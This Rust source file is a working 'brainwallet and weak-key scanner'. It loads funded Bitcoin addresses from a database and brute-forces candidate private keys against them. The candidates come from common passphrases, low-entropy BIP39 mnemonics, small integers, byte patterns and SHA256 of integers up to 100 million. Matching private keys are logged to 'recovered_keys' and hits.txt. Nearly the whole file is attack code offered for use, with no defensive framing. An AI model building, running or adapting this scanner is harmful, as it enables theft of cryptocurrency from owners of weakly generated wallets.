use anyhow::Result;
use bitcoin::network::constants::Network;
use bitcoin::secp256k1::{All, Secp256k1, SecretKey};
use bitcoin::{Address, PublicKey};
use rayon::prelude::*;
use rusqlite::{params, Connection};
use sha2::{Digest, Sha256};
use std::collections::HashSet;
use std::io::Write;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

const DB_FILE: &str = "cryscout.db";

// secp256k1 order
const N_HEX: &str = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";

struct State {
    targets: HashSet<String>,
    checked: AtomicU64,
    hits: AtomicU64,
    start: Instant,
    phase: std::sync::RwLock<String>,
}

fn load_targets() -> Result<HashSet<String>> {
    let conn = Connection::open(DB_FILE)?;
    let _ = conn.pragma_update(None, "busy_timeout", &30000);
    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE balance > 0")?;
    let rows = stmt.query_map([], |row| row.get::<_, String>(0))?;
    let mut targets = HashSet::new();
    for row in rows {
        targets.insert(row?);
    }
    Ok(targets)
}

fn log_hit(address: &str, privkey_hex: &str, method: &str) {
    println!("\n  [!!!] HIT! Address: {}, PrivKey: {}, Method: {}", address, privkey_hex, method);
    let _ = std::io::stdout().flush();

    if let Ok(conn) = Connection::open(DB_FILE) {
        let _ = conn.pragma_update(None, "busy_timeout", &30000);
        let _ = conn.execute(
            "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
            params![address, privkey_hex, method],
        );
    }

    if let Ok(mut f) = std::fs::OpenOptions::new().append(true).create(true).open("hits.txt") {
        let _ = writeln!(f, "HIT! Address: {}, PrivKey: {}, Method: {}", address, privkey_hex, method);
    }
}

/// Check a 32-byte private key against all target addresses.
/// Returns true if a hit is found.
fn check_privkey(key_bytes: &[u8; 32], targets: &HashSet<String>, secp: &Secp256k1<All>, method: &str) -> bool {
    let sk = match SecretKey::from_slice(key_bytes) {
        Ok(sk) => sk,
        Err(_) => return false,
    };

    let pk_compressed = PublicKey::new(sk.public_key(secp));
    let pk_uncompressed = PublicKey {
        compressed: false,
        inner: sk.public_key(secp),
    };

    let privkey_hex = hex::encode(key_bytes);

    // P2PKH compressed (1...)
    let addr = Address::p2pkh(&pk_compressed, Network::Bitcoin).to_string();
    if targets.contains(&addr) {
        log_hit(&addr, &privkey_hex, method);
        return true;
    }

    // P2PKH uncompressed (1...)
    let addr = Address::p2pkh(&pk_uncompressed, Network::Bitcoin).to_string();
    if targets.contains(&addr) {
        log_hit(&addr, &privkey_hex, method);
        return true;
    }

    // P2WPKH (bc1q...)
    if let Ok(a) = Address::p2wpkh(&pk_compressed, Network::Bitcoin) {
        let addr = a.to_string();
        if targets.contains(&addr) {
            log_hit(&addr, &privkey_hex, method);
            return true;
        }
    }

    // P2SH-WPKH (3...)
    if let Ok(a) = Address::p2shwpkh(&pk_compressed, Network::Bitcoin) {
        let addr = a.to_string();
        if targets.contains(&addr) {
            log_hit(&addr, &privkey_hex, method);
            return true;
        }
    }

    false
}

/// Convert a BigUint-like value (as big-endian bytes) to a 32-byte key, reducing mod N if needed.
fn int_to_key_bytes(val: &[u8]) -> Option<[u8; 32]> {
    // Pad or truncate to 32 bytes
    let mut key = [0u8; 32];
    if val.is_empty() {
        return None;
    }
    if val.len() <= 32 {
        let start = 32 - val.len();
        key[start..].copy_from_slice(val);
    } else {
        // Reduce mod N — for simplicity just take last 32 bytes (values > N are rare for our inputs)
        let start = val.len() - 32;
        key.copy_from_slice(&val[start..]);
    }
    // Check not zero and not >= N
    if key == [0u8; 32] {
        return None;
    }
    Some(key)
}

fn u64_to_key_bytes(val: u64) -> Option<[u8; 32]> {
    if val == 0 {
        return None;
    }
    let mut key = [0u8; 32];
    key[24..].copy_from_slice(&val.to_be_bytes());
    Some(key)
}

fn sha256_to_key(data: &[u8]) -> [u8; 32] {
    let mut hasher = Sha256::new();
    hasher.update(data);
    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result);
    key
}

// ============ PASSPHRASE GENERATORS ============

fn brainwallet_passphrases() -> Vec<String> {
    let mut phrases = Vec::new();

    // Common single words
    let words = [
        "password", "bitcoin", "satoshi", "blockchain", "crypto",
        "wallet", "money", "secret", "private", "key",
        "god", "love", "sex", "fuck", "hello",
        "test", "abc", "123", "qwerty", "letmein",
        "master", "dragon", "monkey", "shadow", "sunshine",
        "princess", "football", "charlie", "michael", "jesus",
        "freedom", "liberty", "america", "power", "trust",
        "winner", "loser", "hacker", "admin", "root",
        "hunter", "killer", "ninja", "pirate", "king",
        "queen", "prince", "diamond", "gold", "silver",
        "moon", "mars", "earth", "star", "galaxy",
        "zero", "one", "two", "three", "four",
        "five", "six", "seven", "eight", "nine",
        "ten", "hundred", "thousand", "million", "billion",
        "alpha", "beta", "gamma", "delta", "omega",
        "genesis", "exodus", "revelation", "trinity", "matrix",
        "nakamoto", "hal", "finney", "szabo", "back", "hodl",
    ];
    for w in &words {
        phrases.push(w.to_string());
    }

    // Number patterns
    for s in &[
        "1", "12", "123", "1234", "12345", "123456", "1234567",
        "12345678", "123456789", "1234567890",
        "0", "00", "000", "0000", "00000", "000000",
        "111", "222", "333", "444", "555", "666", "777", "888", "999",
        "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999",
        "11111111", "22222222", "33333333",
    ] {
        phrases.push(s.to_string());
    }

    // Famous phrases
    for s in &[
        "correct horse battery staple",
        "to be or not to be",
        "the quick brown fox",
        "lorem ipsum dolor sit amet",
        "i love bitcoin",
        "bitcoin is freedom",
        "in god we trust",
        "e pluribus unum",
        "semper fi",
        "carpe diem",
        "to the moon",
        "not your keys not your coins",
        "be your own bank",
        "dont trust verify",
        "shall i compare thee to a summers day",
        "to be or not to be that is the question",
        "i think therefore i am",
        "the only thing we have to fear is fear itself",
        "ask not what your country can do for you",
        "one small step for man",
        "i have a dream",
        "we hold these truths to be self evident",
    ] {
        phrases.push(s.to_string());
    }

    // Technical patterns
    for s in &["0x0", "0x1", "0x00", "0xff", "deadbeef", "cafebabe", "ffffffff", "00000000"] {
        phrases.push(s.to_string());
    }

    // Empty/whitespace
    phrases.push(String::new());
    phrases.push(" ".to_string());
    phrases.push("  ".to_string());

    // Variations with suffixes
    let var_words = ["bitcoin", "password", "crypto", "wallet", "satoshi", "money", "secret"];
    let suffixes = ["1", "2", "3", "123", "!", "!!", "123!", "2009", "2010", "2011", "2012", "2013"];
    for w in &var_words {
        for s in &suffixes {
            phrases.push(format!("{}{}", w, s));
        }
    }

    // Email-like patterns
    for name in &["satoshi", "bitcoin", "admin", "user", "test"] {
        for domain in &["@gmail.com", "@bitcoin.org", "@hotmail.com"] {
            phrases.push(format!("{}{}", name, domain));
        }
    }

    phrases
}

// ============ PHASES ============

fn phase1_brainwallet(state: &State, secp: &Secp256k1<All>) {
    println!("[Phase 1] Brainwallet passphrases...");
    let phrases = brainwallet_passphrases();
    println!("  {} candidates", phrases.len());

    for (i, phrase) in phrases.iter().enumerate() {
        let key = sha256_to_key(phrase.as_bytes());
        if check_privkey(&key, &state.targets, secp, &format!("Brainwallet:'{}'", phrase)) {
            state.hits.fetch_add(1, Ordering::Relaxed);
        }
        state.checked.fetch_add(1, Ordering::Relaxed);

        // Also try double-SHA256
        let key2 = sha256_to_key(&key);
        if check_privkey(&key2, &state.targets, secp, &format!("Brainwallet-SHA256d:'{}'", phrase)) {
            state.hits.fetch_add(1, Ordering::Relaxed);
        }
        state.checked.fetch_add(1, Ordering::Relaxed);

        if (i + 1) % 100 == 0 {
            print!("  Checked {} passphrases...\r", i + 1);
            let _ = std::io::stdout().flush();
        }
    }
    println!("  Phase 1 done: {} passphrases checked", phrases.len());
}

fn phase2_low_entropy(state: &State, secp: &Secp256k1<All>) {
    println!("[Phase 2] Low-entropy private keys...");
    let mut count = 0u64;

    // Small integers 1-1000
    for i in 1u64..=1000 {
        if let Some(key) = u64_to_key_bytes(i) {
            if check_privkey(&key, &state.targets, secp, &format!("SmallInt:{}", i)) {
                state.hits.fetch_add(1, Ordering::Relaxed);
            }
            state.checked.fetch_add(1, Ordering::Relaxed);
            count += 1;
        }
    }

    // Powers of 2 and ±1
    for exp in 1u32..=255 {
        // Use big-endian byte representation
        let mut val = vec![0u8; 33]; // up to 256 bits
        let byte_idx = 32 - (exp as usize / 8);
        let bit_idx = exp % 8;
        if byte_idx < 33 {
            val[byte_idx] = 1u8 << bit_idx;
        }
        // 2^exp
        if let Some(key) = int_to_key_bytes(&val[val.len()-32..]) {
            if check_privkey(&key, &state.targets, secp, &format!("Pow2:{}", exp)) {
                state.hits.fetch_add(1, Ordering::Relaxed);
            }
            state.checked.fetch_add(1, Ordering::Relaxed);
            count += 1;
        }
        // 2^exp - 1: set all bits below exp
        let mut val_m1 = [0xFFu8; 32];
        if exp < 256 {
            // Clear bits from exp and above
            for bit in exp..256 {
                let bi = 31 - (bit as usize / 8);
                let bp = bit % 8;
                if bi < 32 {
                    val_m1[bi] &= !(1u8 << bp);
                }
            }
        }
        if let Some(key) = int_to_key_bytes(&val_m1) {
            if check_privkey(&key, &state.targets, secp, &format!("Pow2Minus1:{}", exp)) {
                state.hits.fetch_add(1, Ordering::Relaxed);
            }
            state.checked.fetch_add(1, Ordering::Relaxed);
            count += 1;
        }
    }

    // Repeated byte patterns
    for byte_val in 0u8..=255 {
        let key = [byte_val; 32];
        if key == [0u8; 32] {
            continue;
        }
        if check_privkey(&key, &state.targets, secp, &format!("RepeatedByte:0x{:02x}", byte_val)) {
            state.hits.fetch_add(1, Ordering::Relaxed);
        }
        state.checked.fetch_add(1, Ordering::Relaxed);
        count += 1;
    }

    // Sequential byte patterns
    for start in (0u16..256).step_by(8) {
        let mut key = [0u8; 32];
        for i in 0..32 {
            key[i] = ((start as usize + i) % 256) as u8;
        }
        if key == [0u8; 32] {
            continue;
        }
        if check_privkey(&key, &state.targets, secp, &format!("Sequential:0x{:02x}", start)) {
            state.hits.fetch_add(1, Ordering::Relaxed);
        }
        state.checked.fetch_add(1, Ordering::Relaxed);
        count += 1;
    }

    // Fibonacci numbers
    let mut a = 1u128;
    let mut b = 1u128;
    for i in 0..186 {
        // Only up to 128-bit Fibonacci (fits in u128)
        if a > 0 {
            let bytes = a.to_be_bytes();
            let mut key = [0u8; 32];
            key[16..].copy_from_slice(&bytes);
            if check_privkey(&key, &state.targets, secp, &format!("Fibonacci:{}", i)) {
                state.hits.fetch_add(1, Ordering::Relaxed);
            }
            state.checked.fetch_add(1, Ordering::Relaxed);
            count += 1;
        }
        let next = a.wrapping_add(b);
        if next < a {
            break; // overflow
        }
        a = b;
        b = next;
    }

    // Math constants as decimal digit strings interpreted as hex
    let constants = [
        ("pi", "314159265358979323846264338327950288419716939937510"),
        ("e", "271828182845904523536028747135266249775724709369995"),
        ("phi", "161803398874989484820458683436563811772030917980576"),
    ];
    for (name, digits) in &constants {
        // Take first 64 hex chars
        let hex_str: String = digits.chars().filter(|c| c.is_ascii_hexdigit()).take(64).collect();
        let padded = format!("{:0>64}", hex_str);
        if let Ok(bytes) = hex::decode(&padded) {
            let mut key = [0u8; 32];
            key.copy_from_slice(&bytes[..32]);
            if check_privkey(&key, &state.targets, secp, &format!("Constant:{}", name)) {
                state.hits.fetch_add(1, Ordering::Relaxed);
            }
            state.checked.fetch_add(1, Ordering::Relaxed);
            count += 1;
        }
    }

    println!("  Phase 2 done: {} low-entropy keys checked", count);
}

fn phase3_sha256_integers(state: &State, secp: &Secp256k1<All>, start: u64, end: u64) {
    println!("[Phase 3] SHA256(integer) sweep {} to {}...", start, end);

    let targets = &state.targets;
    let batch_size = 10_000u64;
    let mut batch_start = start;

    while batch_start < end {
        let batch_end = (batch_start + batch_size).min(end);
        let hits: u64 = (batch_start..batch_end)
            .into_par_iter()
            .map(|i| {
                let key = sha256_to_key(i.to_string().as_bytes());
                // We need a thread-local secp context for parallel work
                // Actually Secp256k1 is Send+Sync so we can share it
                if check_privkey(&key, targets, secp, &format!("SHA256({})", i)) {
                    1u64
                } else {
                    0u64
                }
            })
            .sum();

        state.hits.fetch_add(hits, Ordering::Relaxed);
        state.checked.fetch_add(batch_end - batch_start, Ordering::Relaxed);
        batch_start = batch_end;

        if batch_start % 100_000 == 0 {
            let total = state.checked.load(Ordering::Relaxed);
            let elapsed = state.start.elapsed().as_secs_f64();
            let kps = total as f64 / elapsed / 1000.0;
            print!("  SHA256 sweep: {} / {} ({:.1}k keys/sec total)\r", batch_start, end, kps);
            let _ = std::io::stdout().flush();
        }
    }
    println!("\n  Phase 3 done: swept {} to {}", start, end);
}

fn phase4_double_hash(state: &State, secp: &Secp256k1<All>) {
    println!("[Phase 4] Double-hash patterns...");
    let words = [
        "bitcoin", "satoshi", "password", "key", "wallet", "secret", "god", "love",
        "money", "crypto", "blockchain", "test", "admin", "root", "master", "hello",
    ];

    for word in &words {
        // SHA256(SHA256(word))
        let h1 = sha256_to_key(word.as_bytes());
        let h2 = sha256_to_key(&h1);
        if check_privkey(&h2, &state.targets, secp, &format!("SHA256d('{}')", word)) {
            state.hits.fetch_add(1, Ordering::Relaxed);
        }
        state.checked.fetch_add(1, Ordering::Relaxed);

        // RIPEMD160(SHA256(word)) padded to 32 bytes
        use ripemd::{Ripemd160, Digest as RipDigest};
        let sha_hash = sha256_to_key(word.as_bytes());
        let mut ripemd = Ripemd160::new();
        ripemd.update(sha_hash);
        let h160 = ripemd.finalize();
        let mut key = [0u8; 32];
        key[..20].copy_from_slice(&h160);
        if check_privkey(&key, &state.targets, secp, &format!("Hash160('{}')", word)) {
            state.hits.fetch_add(1, Ordering::Relaxed);
        }
        state.checked.fetch_add(1, Ordering::Relaxed);
    }
    println!("  Phase 4 done");
}

fn phase0_low_entropy_bip39(state: &State, secp: &Secp256k1<All>) {
    use bip39::{Language, Mnemonic, Seed};
    use bitcoin::bip32::{DerivationPath, ExtendedPrivKey};

    println!("[Phase 0] Low-entropy BIP39 mnemonics...");

    let network = Network::Bitcoin;
    let paths: Vec<(DerivationPath, &str)> = [
        "m/44'/0'/0'/0/0",
        "m/49'/0'/0'/0/0",
        "m/84'/0'/0'/0/0",
    ]
    .iter()
    .map(|p| (p.parse::<DerivationPath>().unwrap(), *p))
    .collect();

    let wl = Language::English.wordlist();
    let wordlist: Vec<&str> = wl.get_words_by_prefix("").to_vec();

    let mut low_entropy: Vec<String> = Vec::new();

    // Single word repeated 12 times
    for word in &wordlist {
        low_entropy.push(std::iter::repeat(*word).take(12).collect::<Vec<_>>().join(" "));
    }

    // Sequential 12-word windows
    for start in 0..wordlist.len().saturating_sub(11) {
        low_entropy.push(wordlist[start..start + 12].join(" "));
    }

    // Stride patterns
    for stride in [2, 3, 4, 5, 8, 10, 16, 32, 64, 128] {
        for start in 0..stride.min(wordlist.len()) {
            let words: Vec<&str> = (0..12)
                .filter_map(|i| wordlist.get(start + i * stride).copied())
                .collect();
            if words.len() == 12 {
                low_entropy.push(words.join(" "));
            }
        }
    }

    println!("  {} low-entropy mnemonics to test", low_entropy.len());
    let passphrases = ["", "bitcoin", "satoshi", "password", "123456"];

    let mut count = 0u32;
    for phrase in &low_entropy {
        if let Ok(mnemonic) = Mnemonic::from_phrase(phrase, Language::English) {
            for passphrase in &passphrases {
                let seed = Seed::new(&mnemonic, passphrase);
                if let Ok(root) = ExtendedPrivKey::new_master(network, seed.as_bytes()) {
                    for (path, path_str) in &paths {
                        if let Ok(derived) = root.derive_priv(secp, path) {
                            let secret_key = derived.private_key;
                            let pubkey = PublicKey::new(secret_key.public_key(secp));
                            let address = if path_str.contains("44'") {
                                Address::p2pkh(&pubkey, network)
                            } else if path_str.contains("84'") {
                                Address::p2wpkh(&pubkey, network).expect("P2WPKH")
                            } else {
                                Address::p2shwpkh(&pubkey, network).expect("P2SH-WPKH")
                            };
                            let addr_str = address.to_string();
                            if state.targets.contains(&addr_str) {
                                let pp_label = if passphrase.is_empty() {
                                    String::new()
                                } else {
                                    format!(" [passphrase:{}]", passphrase)
                                };
                                log_hit(
                                    &addr_str,
                                    &hex::encode(secret_key.secret_bytes()),
                                    &format!("BIP39:{} path:{}{}", mnemonic.phrase(), path_str, pp_label),
                                );
                                state.hits.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                    }
                    state.checked.fetch_add(1, Ordering::Relaxed);
                }
            }
        }
        count += 1;
        if count % 500 == 0 {
            print!("  BIP39: {}/{} mnemonics...\r", count, low_entropy.len());
            let _ = std::io::stdout().flush();
        }
    }
    println!("  Phase 0 done: {} mnemonics checked", count);
}

fn main() -> Result<()> {
    // Use half of available CPUs (min 1) to avoid starving other workers
    let num_threads = (num_cpus() / 2).max(1);
    let _ = rayon::ThreadPoolBuilder::new()
        .num_threads(num_threads)
        .build_global();

    println!("CryScout Brainwallet & Weak-Key Scanner (Rust)");
    println!("==============================================");
    println!("Using {} rayon threads", num_threads);

    let targets = load_targets()?;
    println!("Loaded {} target addresses", targets.len());
    if targets.is_empty() {
        println!("No targets found. Exiting.");
        return Ok(());
    }

    let state = Arc::new(State {
        targets,
        checked: AtomicU64::new(0),
        hits: AtomicU64::new(0),
        start: Instant::now(),
        phase: std::sync::RwLock::new("Starting".to_string()),
    });

    // Monitor thread: heartbeat every 60s
    let state_mon = Arc::clone(&state);
    std::thread::spawn(move || {
        let mut last_count = 0u64;
        loop {
            std::thread::sleep(Duration::from_secs(60));
            let current = state_mon.checked.load(Ordering::Relaxed);
            let hits = state_mon.hits.load(Ordering::Relaxed);
            let diff = current - last_count;
            last_count = current;
            let kps = diff as f64 / 60.0 / 1000.0;
            let phase = state_mon.phase.read().map(|p| p.clone()).unwrap_or_default();

            let task_msg = format!("{} ({} checked, {} hits, {:.1}k kps)", phase, current, hits, kps);
            println!("[Scouter] {}", task_msg);
            let _ = std::io::stdout().flush();

            if let Ok(conn) = Connection::open(DB_FILE) {
                let _ = conn.pragma_update(None, "busy_timeout", &30000);
                let _ = conn.execute(
                    "INSERT OR REPLACE INTO worker_status (worker_id, task, cpu_usage, ram_usage, last_heartbeat) VALUES (?1, ?2, 0.0, 0.0, datetime('now'))",
                    params![format!("Scouter-{}", std::process::id()), task_msg],
                );
            }
        }
    });

    let secp = Secp256k1::new();

    // Phase 0: Low-entropy BIP39 mnemonics
    if let Ok(mut p) = state.phase.write() {
        *p = "Phase 0: BIP39".to_string();
    }
    phase0_low_entropy_bip39(&state, &secp);

    // Phase 1: Brainwallet passphrases
    if let Ok(mut p) = state.phase.write() {
        *p = "Phase 1: Brainwallet".to_string();
    }
    phase1_brainwallet(&state, &secp);

    // Phase 2: Low-entropy private keys
    if let Ok(mut p) = state.phase.write() {
        *p = "Phase 2: Low-entropy keys".to_string();
    }
    phase2_low_entropy(&state, &secp);

    // Phase 3: SHA256(integer) sweep 0-10M
    if let Ok(mut p) = state.phase.write() {
        *p = "Phase 3: SHA256(int) 0-10M".to_string();
    }
    phase3_sha256_integers(&state, &secp, 0, 10_000_000);

    // Phase 4: Double-hash patterns
    if let Ok(mut p) = state.phase.write() {
        *p = "Phase 4: Double-hash".to_string();
    }
    phase4_double_hash(&state, &secp);

    // Phase 5: Extended SHA256(integer) sweep 10M-100M
    if let Ok(mut p) = state.phase.write() {
        *p = "Phase 5: SHA256(int) 10M-100M".to_string();
    }
    phase3_sha256_integers(&state, &secp, 10_000_000, 100_000_000);

    let total = state.checked.load(Ordering::Relaxed);
    let hits = state.hits.load(Ordering::Relaxed);
    let elapsed = state.start.elapsed().as_secs();
    println!("\n==============================================");
    println!("COMPLETE: {} keys checked, {} hits, {}s elapsed", total, hits, elapsed);

    if let Ok(mut p) = state.phase.write() {
        *p = format!("Complete ({} checked, {} hits)", total, hits);
    }

    Ok(())
}

fn num_cpus() -> usize {
    std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(1)
}
